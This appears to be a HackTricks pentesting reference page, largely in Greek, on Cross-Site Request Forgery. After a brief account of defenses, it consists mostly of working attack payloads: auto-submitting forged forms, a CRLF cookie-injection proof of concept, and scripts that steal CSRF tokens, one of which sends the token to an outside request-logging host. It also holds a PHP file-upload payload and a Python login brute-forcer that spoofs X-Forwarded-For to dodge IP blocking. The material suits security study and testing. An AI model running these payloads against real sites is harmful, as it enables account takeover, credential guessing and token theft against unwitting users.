# CSRF (Cross Site Request Forgery)

{{#include ../banners/hacktricks-training.md}}

## Cross-Site Request Forgery (CSRF) Εξήγηση

**Cross-Site Request Forgery (CSRF)** είναι ένας τύπος ευπάθειας ασφάλειας που εντοπίζεται σε web εφαρμογές. Επιτρέπει σε επιτιθέμενους να εκτελούν ενέργειες εκ μέρους ανυποψίαστων χρηστών εκμεταλλευόμενοι τις πιστοποιημένες συνεδρίες τους. Η επίθεση εκτελείται όταν ένας χρήστης, ο οποίος είναι συνδεδεμένος στην πλατφόρμα του θύματος, επισκέπτεται έναν κακόβουλο ιστότοπο. Ο ιστότοπος αυτός στη συνέχεια ενεργοποιεί αιτήματα προς τον λογαριασμό του θύματος μέσω μεθόδων όπως η εκτέλεση JavaScript, η υποβολή φορμών ή η φόρτωση εικόνων.

### Προαπαιτούμενα για μια επίθεση CSRF

Για να εκμεταλλευτείτε μια ευπάθεια CSRF, πρέπει να πληρούνται αρκετές προϋποθέσεις:

1. **Εντοπισμός σημαντικής ενέργειας**: Ο επιτιθέμενος πρέπει να βρει μια ενέργεια που αξίζει να εκμεταλλευτεί, όπως η αλλαγή κωδικού, email ή η ανύψωση προνομίων.
2. **Διαχείριση συνεδρίας**: Η συνεδρία του χρήστη θα πρέπει να διαχειρίζεται αποκλειστικά μέσω cookies ή του HTTP Basic Authentication header, καθώς άλλα headers δεν μπορούν να χειραγωγηθούν για αυτόν τον σκοπό.
3. **Απουσία μη προβλέψιμων παραμέτρων**: Το αίτημα δεν πρέπει να περιέχει μη προβλέψιμες παραμέτρους, καθώς αυτές μπορούν να αποτρέψουν την επίθεση.

### Γρήγορος Έλεγχος

Μπορείτε να **καταγράψετε το αίτημα με το Burp** και να ελέγξετε τις προστασίες CSRF και, για δοκιμή από τον browser, μπορείτε να κάνετε κλικ στο **Copy as fetch** και να ελέγξετε το αίτημα:

<figure><img src="../images/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Προστασία έναντι CSRF

Μπορούν να εφαρμοστούν αρκετά αντίμετρα για την προστασία έναντι επιθέσεων CSRF:

- [**SameSite cookies**](hacking-with-cookies/index.html#samesite): Αυτό το attribute εμποδίζει τον browser από το να στέλνει cookies μαζί με cross-site αιτήματα. [More about SameSite cookies](hacking-with-cookies/index.html#samesite).
- [**Cross-origin resource sharing**](cors-bypass.md): Η πολιτική CORS του ιστότοπου-θύματος μπορεί να επηρεάσει τη δυνατότητα εκτέλεσης της επίθεσης, ειδικά αν η επίθεση απαιτεί ανάγνωση της απόκρισης από τον ιστότοπο του θύματος. [Learn about CORS bypass](cors-bypass.md).
- **Επαλήθευση Χρήστη**: Η απαίτηση για τον κωδικό του χρήστη ή η επίλυση ενός captcha μπορεί να επιβεβαιώσει την πρόθεση του χρήστη.
- **Έλεγχος Referrer ή Origin Headers**: Η επικύρωση αυτών των headers μπορεί να βοηθήσει να διασφαλιστεί ότι τα αιτήματα προέρχονται από αξιόπιστες πηγές. Ωστόσο, η προσεκτική διαμόρφωση URLs μπορεί να παρακάμψει κακώς υλοποιημένους ελέγχους, όπως:
  - Using `http://mal.net?orig=http://example.com` (το URL τελειώνει με το αξιόπιστο URL)
  - Using `http://example.com.mal.net` (το URL ξεκινάει με το αξιόπιστο URL)
- **Τροποποίηση Ονομάτων Παραμέτρων**: Η αλλαγή των ονομάτων παραμέτρων σε POST ή GET αιτήματα μπορεί να βοηθήσει στην αποτροπή αυτοματοποιημένων επιθέσεων.
- **CSRF Tokens**: Η ενσωμάτωση ενός μοναδικού CSRF token σε κάθε συνεδρία και η απαίτηση αυτού του token στα επόμενα αιτήματα μπορεί να μειώσει σημαντικά τον κίνδυνο CSRF. Η αποτελεσματικότητα του token μπορεί να ενισχυθεί με την επιβολή CORS.

Η κατανόηση και η εφαρμογή αυτών των αμυντικών μέτρων είναι κρίσιμη για τη διατήρηση της ασφάλειας και της ακεραιότητας των web εφαρμογών.

## Παράκαμψη Αμυντικών Μέτρων

### Από POST σε GET (method-conditioned CSRF validation bypass)

Ορισμένες εφαρμογές εφαρμόζουν έλεγχο CSRF μόνο για POST, παραλείποντάς τον για άλλα HTTP verbs. Ένα κοινό anti-pattern σε PHP μοιάζει με:
```php
public function csrf_check($fatal = true) {
if ($_SERVER['REQUEST_METHOD'] !== 'POST') return true; // GET, HEAD, etc. bypass CSRF
// ... validate __csrf_token here ...
}
```
If the vulnerable endpoint also accepts parameters from $_REQUEST, you can reissue the same action as a GET request and omit the CSRF token entirely. This converts a POST-only action into a GET action that succeeds without a token.

Example:

- Original POST with token (intended):

```http
POST /index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList HTTP/1.1
Content-Type: application/x-www-form-urlencoded

__csrf_token=sid:...&widgetInfoList=[{"widgetId":"https://attacker<img src onerror=alert(1)>","widgetType":"URL"}]
```

- Bypass by switching to GET (no token):

```http
GET /index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList&widgetInfoList=[{"widgetId":"https://attacker<img+src+onerror=alert(1)>","widgetType":"URL"}] HTTP/1.1
```

Σημειώσεις:
- Αυτό το μοτίβο εμφανίζεται συχνά μαζί με reflected XSS όταν οι απαντήσεις σερβίρονται λανθασμένα ως text/html αντί για application/json.
- Ο συνδυασμός αυτού με XSS μειώνει πολύ τα εμπόδια εκμετάλλευσης, καθώς μπορείτε να παραδώσετε ένα μόνο GET link που ταυτόχρονα ενεργοποιεί τον ευάλωτο κώδικα και παρακάμπτει τελείως τους ελέγχους CSRF.

### Έλλειψη token

Οι εφαρμογές μπορεί να εφαρμόζουν μηχανισμό για **επικύρωση token** όταν αυτά υπάρχουν. Ωστόσο, προκύπτει ευπάθεια αν η επικύρωση παραλείπεται εντελώς όταν το token απουσιάζει. Οι επιτιθέμενοι μπορούν να το εκμεταλλευτούν **αφαιρώντας την παράμετρο** που μεταφέρει το token, όχι μόνο την τιμή της. Αυτό τους επιτρέπει να παρακάμψουν τη διαδικασία επικύρωσης και να πραγματοποιήσουν μια Cross-Site Request Forgery (CSRF) attack αποτελεσματικά.

### Το CSRF token δεν συνδέεται με τη συνεδρία χρήστη

Εφαρμογές που **δεν συνδέουν τα CSRF tokens με τις συνεδρίες χρηστών** παρουσιάζουν σημαντικό **κίνδυνο ασφάλειας**. Αυτά τα συστήματα επαληθεύουν tokens εναντίον μιας **παγκόσμιας δεξαμενής** αντί να διασφαλίζουν ότι κάθε token συνδέεται με τη συνεδρία που το δημιούργησε.

Έτσι το εκμεταλλεύονται οι επιτιθέμενοι:
1. Αυθεντικοποιούνται χρησιμοποιώντας το δικό τους λογαριασμό.
2. Αποκτούν ένα έγκυρο CSRF token από την **παγκόσμια δεξαμενή**.
3. Χρησιμοποιούν αυτό το token σε επίθεση CSRF εναντίον του θύματος.

Αυτή η ευπάθεια επιτρέπει στους επιτιθέμενους να κάνουν μη εξουσιοδοτημένα requests εκ μέρους του θύματος, εκμεταλλευόμενοι τον **μη επαρκή μηχανισμό επαλήθευσης token** της εφαρμογής.

### Παρακάμψη μεθόδου

Αν το request χρησιμοποιεί μια "**περίεργη**" **method**, έλεγξε αν λειτουργεί η **method override functionality**. Για παράδειγμα, αν χρησιμοποιεί **PUT** μέθοδο μπορείς να δοκιμάσεις να **χρησιμοποιήσεις POST** και να **στείλεις**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Αυτό μπορεί επίσης να λειτουργήσει στέλνοντας την **\_method παράμετρο μέσα σε ένα POST request** ή χρησιμοποιώντας τα **headers**:

- _X-HTTP-Method_
- _X-HTTP-Method-Override_
- _X-Method-Override_

### Παρακάμψη με προσαρμοσμένο header token

Αν το request προσθέτει ένα **custom header** με ένα **token** ως **μέθοδο προστασίας CSRF**, τότε:

- Δοκίμασε το request χωρίς το **Customized Token και επίσης χωρίς το header.**
- Δοκίμασε το request με **ίδιο ακριβώς μήκος αλλά διαφορετικό token**.

### Το CSRF token επαληθεύεται μέσω cookie

Οι εφαρμογές μπορεί να υλοποιούν προστασία CSRF διπλασιάζοντας το token τόσο σε cookie όσο και σε παράμετρο request ή θέτοντας ένα CSRF cookie και επαληθεύοντας αν το token που αποστέλλεται στο backend αντιστοιχεί στην τιμή του cookie. Η εφαρμογή επαληθεύει τα requests ελέγχοντας αν το token στην παράμετρο request εναρμονίζεται με την τιμή στο cookie.

Ωστόσο, αυτή η μέθοδος είναι ευάλωτη σε CSRF επιθέσεις αν ο ιστότοπος έχει σφάλματα που επιτρέπουν σε έναν επιτιθέμενο να θέσει ένα CSRF cookie στο πρόγραμμα περιήγησης του θύματος, όπως μια ευπάθεια CRLF. Ο επιτιθέμενος μπορεί να το εκμεταλλευτεί φορτώνοντας μια παραπλανητική εικόνα που ορίζει το cookie και στη συνέχεια ξεκινώντας την επίθεση CSRF.

Παρακάτω υπάρχει ένα παράδειγμα για το πώς θα μπορούσε να δομηθεί μια επίθεση:
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>
history.pushState("", "", "/")
</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input
type="hidden"
name="csrf"
value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img
src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E"
onerror="document.forms[0].submit();" />
</body>
</html>
```
> [!TIP]
> Σημειώστε ότι αν το **csrf token σχετίζεται με το session cookie αυτή η επίθεση δεν θα δουλέψει** επειδή θα χρειαστεί να ορίσετε στον victim το session σας, και επομένως θα επιτεθείτε στον εαυτό σας.

### Αλλαγή Content-Type

Σύμφωνα με [**this**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests), για να **αποφύγετε preflight** αιτήματα όταν χρησιμοποιείτε τη μέθοδο **POST**, αυτές είναι οι επιτρεπόμενες τιμές Content-Type:

- **`application/x-www-form-urlencoded`**
- **`multipart/form-data`**
- **`text/plain`**

Ωστόσο, σημειώστε ότι η **λογική του server μπορεί να διαφέρει** ανάλογα με το **Content-Type** που χρησιμοποιείται, οπότε θα πρέπει να δοκιμάσετε τις προαναφερθείσες τιμές και άλλες όπως **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Παράδειγμα (from [here](https://brycec.me/posts/corctf_2021_challenges)) of sending JSON data as text/plain:
```html
<html>
<body>
<form
id="form"
method="post"
action="https://phpme.be.ax/"
enctype="text/plain">
<input
name='{"garbageeeee":"'
value='", "yep": "yep yep yep", "url": "https://webhook/"}' />
</form>
<script>
form.submit()
</script>
</body>
</html>
```
### Παράκαμψη των preflight requests για JSON δεδομένα

Όταν προσπαθείτε να στείλετε δεδομένα JSON μέσω ενός POST request, η χρήση του `Content-Type: application/json` σε μια HTML φόρμα δεν είναι άμεσα δυνατή. Ομοίως, η χρήση του `XMLHttpRequest` για να σταλεί αυτός ο τύπος περιεχομένου προκαλεί ένα preflight request. Παρ' όλα αυτά, υπάρχουν στρατηγικές για πιθανή παράκαμψη αυτού του περιορισμού και για έλεγχο αν ο server επεξεργάζεται τα JSON δεδομένα ανεξάρτητα από το Content-Type:

1. **Use Alternative Content Types**: Χρησιμοποιήστε `Content-Type: text/plain` ή `Content-Type: application/x-www-form-urlencoded` θέτοντας `enctype="text/plain"` στη φόρμα. Αυτή η προσέγγιση ελέγχει αν το backend χρησιμοποιεί τα δεδομένα ανεξάρτητα από το Content-Type.
2. **Modify Content Type**: Για να αποφύγετε ένα preflight request ενώ εξασφαλίζετε ότι ο server αναγνωρίζει το περιεχόμενο ως JSON, μπορείτε να στείλετε τα δεδομένα με `Content-Type: text/plain; application/json`. Αυτό δεν προκαλεί preflight request αλλά μπορεί να επεξεργαστεί σωστά από τον server αν είναι ρυθμισμένος να δέχεται `application/json`.
3. **SWF Flash File Utilization**: Μια λιγότερο συχνή αλλά εφικτή μέθοδος περιλαμβάνει τη χρήση ενός SWF flash file για παράκαμψη τέτοιων περιορισμών. Για λεπτομερή κατανόηση αυτής της τεχνικής, ανατρέξτε σε [this post](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Παράκαμψη ελέγχου Referrer / Origin

**Αποφύγετε το Referrer header**

Οι εφαρμογές μπορεί να επικυρώνουν την κεφαλίδα 'Referer' μόνο όταν αυτή υπάρχει. Για να εμποδίσετε έναν browser από το να στείλει αυτή την κεφαλίδα, μπορεί να χρησιμοποιηθεί το ακόλουθο HTML meta tag:
```xml
<meta name="referrer" content="never">
```
Αυτό εξασφαλίζει ότι η κεφαλίδα 'Referer' παραλείπεται, ενδεχομένως παρακάμπτοντας ελέγχους επικύρωσης σε κάποιες εφαρμογές.

**Regexp bypasses**


{{#ref}}
ssrf-server-side-request-forgery/url-format-bypass.md
{{#endref}}

Για να ορίσετε το domain name του server στο URL που ο Referrer είναι πρόκειται να στείλει μέσα στις παραμέτρους μπορείτε να κάνετε:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head>
<meta name="referrer" content="unsafe-url" />
</head>
<body>
<script>
history.pushState("", "", "/")
</script>
<form
action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email"
method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState(
"",
"",
"?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net"
)
document.forms[0].submit()
</script>
</body>
</html>
```
### **HEAD method bypass**

Το πρώτο μέρος του [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) εξηγεί ότι στον [Oak's source code](https://github.com/oakserver/oak/blob/main/router.ts#L281), ένας router έχει ρυθμιστεί να **handle HEAD requests as GET requests** χωρίς σώμα απάντησης — ένα κοινό workaround που δεν είναι μοναδικό στον Oak. Αντί για έναν ειδικό handler που διαχειρίζεται τα HEAD reqs, απλώς **given to the GET handler but the app just removes the response body**.

Επομένως, αν ένα GET request περιορίζεται, μπορείτε απλά **να στείλετε ένα HEAD request που θα επεξεργαστεί ως GET request**.

## **Exploit Examples**

### **Exfiltrating CSRF Token**

Αν ένα **CSRF token** χρησιμοποιείται ως **defence**, μπορείτε να προσπαθήσετε να το **exfiltrate it** εκμεταλλευόμενοι μια [**XSS**](xss-cross-site-scripting/index.html#xss-stealing-csrf-tokens) ευπάθεια ή μια [**Dangling Markup**](dangling-markup-html-scriptless-injection/index.html) ευπάθεια.

### **GET using HTML tags**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Άλλες ετικέτες HTML5 που μπορούν να χρησιμοποιηθούν για να στείλουν αυτόματα ένα GET request είναι:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="" />
<embed src="..." />
<audio src="...">
<video src="...">
<source src="..." type="..." />
<video poster="...">
<link rel="stylesheet" href="..." />
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body {
background: url("...");
}
</style>
<bgsound src="...">
<track src="..." kind="subtitles" />
<input type="image" src="..." alt="Submit Button"
/></bgsound>
</body>
</object>
</video>
</video>
</audio>
```
### GET αίτημα φόρμας
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>
history.pushState("", "", "/")
</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit()
</script>
</body>
</html>
```
### POST αίτημα φόρμας
```html
<html>
<body>
<script>
history.pushState("", "", "/")
</script>
<form
method="POST"
action="https://victim.net/email/change-email"
id="csrfform">
<input
type="hidden"
name="email"
value="some@email.com"
autofocus
onfocus="csrfform.submit();" />
<!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src="x" onerror="csrfform.submit();" />
<!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit() //Way 3 to autosubmit
</script>
</body>
</html>
```
### Φόρμα POST request μέσω iframe
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input
type="hidden"
name="email"
value="some@email.com"
autofocus
onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit()
</script>
</body>
</html>
```
### **Ajax POST αίτημα**
```html
<script>
var xh
if (window.XMLHttpRequest) {
// code for IE7+, Firefox, Chrome, Opera, Safari
xh = new XMLHttpRequest()
} else {
// code for IE6, IE5
xh = new ActiveXObject("Microsoft.XMLHTTP")
}
xh.withCredentials = true
xh.open(
"POST",
"http://challenge01.root-me.org/web-client/ch22/?action=profile"
)
xh.setRequestHeader("Content-type", "application/x-www-form-urlencoded") //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on")
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2",
})
</script>
```
### multipart/form-data POST αίτημα
```javascript
myFormData = new FormData()
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text" })
myFormData.append("newAttachment", blob, "pwned.php")
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: { "Content-Type": "application/x-www-form-urlencoded" },
mode: "no-cors",
})
```
### multipart/form-data POST αίτημα v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest()
xhr.withCredentials = true
xhr.open("POST", url, true)
//  MIME POST request.
xhr.setRequestHeader(
"Content-Type",
"multipart/form-data, boundary=" + boundary
)
xhr.setRequestHeader("Content-Length", fileSize)
var body = "--" + boundary + "\r\n"
body +=
'Content-Disposition: form-data; name="' +
nameVar +
'"; filename="' +
fileName +
'"\r\n'
body += "Content-Type: " + ctype + "\r\n\r\n"
body += fileData + "\r\n"
body += "--" + boundary + "--"

//xhr.send(body);
xhr.sendAsBinary(body)
```
### Φόρμα POST request από μέσα σε ένα iframe
```html
<--! expl.html -->

<body onload="envia()">
<form
method="POST"
id="formulario"
action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva" />
</form>
<body>
<script>
function envia() {
document.getElementById("formulario").submit()
}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000"> </iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
</body>
</body>
```
### **Υποκλοπή CSRF Token και αποστολή ενός POST request**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest()
xhr.open("POST", POST_URL, true)
xhr.withCredentials = true

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded")

// This is for debugging and can be removed
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy")
}

function getTokenJS() {
var xhr = new XMLHttpRequest()
// This tels it to return it as a HTML document
xhr.responseType = "document"
xhr.withCredentials = true
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true)
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token")
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value)
}
}
// Make the request
xhr.send(null)
}

var GET_URL = "http://google.com?param=VALUE"
var POST_URL = "http://google.com?param=VALUE"
getTokenJS()
```
### **Υποκλοπή CSRF Token και αποστολή Post request με iframe, form και Ajax**
```html
<form
id="form1"
action="http://google.com?param=VALUE"
method="post"
enctype="multipart/form-data">
<input type="text" name="username" value="AA" />
<input type="checkbox" name="status" checked="checked" />
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1() {
x1 = document.getElementById("i1")
x1d = x1.contentWindow || x1.contentDocument
t = x1d.document.getElementById("token").value

document.getElementById("token").value = t
document.getElementById("form1").submit()
}
</script>
<iframe
id="i1"
style="display:none"
src="http://google.com?param=VALUE"
onload="javascript:f1();"></iframe>
```
### **Κλέψε το CSRF Token και στείλε ένα POST request χρησιμοποιώντας ένα iframe και μία form**
```html
<iframe
id="iframe"
src="http://google.com?param=VALUE"
width="500"
height="500"
onload="read()"></iframe>

<script>
function read() {
var name = "admin2"
var token =
document.getElementById("iframe").contentDocument.forms[0].token.value
document.writeln(
'<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">'
)
document.writeln(
'<input id="username" type="text" name="username" value="' +
name +
'" /><br />'
)
document.writeln(
'<input id="token" type="hidden" name="token" value="' + token + '" />'
)
document.writeln(
'<input type="submit" name="submit" value="Submit" /><br/>'
)
document.writeln("</form>")
document.forms[0].submit.click()
}
</script>
```
### **Κλέψε token και στείλε το χρησιμοποιώντας 2 iframes**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTSteal CSRF token με Ajax και στείλε ένα post με form**
```html
<body onload="getData()">
<form
id="form"
action="http://google.com?param=VALUE"
method="POST"
enctype="multipart/form-data">
<input type="hidden" name="username" value="root" />
<input type="hidden" name="status" value="on" />
<input type="hidden" id="findtoken" name="token" value="" />
<input type="submit" value="valider" />
</form>

<script>
var x = new XMLHttpRequest()
function getData() {
x.withCredentials = true
x.open("GET", "http://google.com?param=VALUE", true)
x.send(null)
}
x.onreadystatechange = function () {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1]
document.getElementById("findtoken").value = token
document.getElementById("form").submit()
}
}
</script>
</body>
```
### CSRF με Socket.IO
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io("http://six.jh2i.com:50022/test")

const username = "admin"

socket.on("connect", () => {
console.log("connected!")
socket.emit("join", {
room: username,
})
socket.emit("my_room_event", {
data: "!flag",
room: username,
})
})
</script>
```
## CSRF Login Brute Force

Ο κώδικας μπορεί να χρησιμοποιηθεί για Brute Force μιας φόρμας σύνδεσης χρησιμοποιώντας ένα CSRF token (Χρησιμοποιεί επίσης το header X-Forwarded-For για να προσπαθήσει να παρακάμψει πιθανό IP blacklisting):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Εργαλεία <a href="#tools" id="tools"></a>

- [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
- [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Αναφορές

- [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
- [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
- [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)

{{#include ../banners/hacktricks-training.md}}
